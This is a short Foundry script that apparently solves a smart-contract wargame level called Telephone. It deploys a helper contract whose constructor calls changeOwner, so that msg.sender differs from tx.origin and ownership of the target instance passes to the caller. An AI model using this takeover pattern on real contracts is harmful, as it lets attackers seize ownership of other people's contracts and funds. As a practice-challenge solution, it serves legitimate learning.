

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { Telephone } from "../src/Telephone.sol";

contract Helper {
    constructor (Telephone t) {
        t.changeOwner(msg.sender);
    }
}

contract TelephoneSolver is Script {

    Telephone public instance = Telephone(0xA3b25A3DC474a625673Ca7592fD403d0AA91d176);

	uint256 prv = vm.envUint("PRV");
	address pub = vm.envAddress("PUB");

    function run() external {
        vm.startBroadcast(prv);
        console.log("before ---> ", instance.owner());
        new Helper(instance);
        console.log("after ---> ", instance.owner());

        vm.stopBroadcast();
    }

}

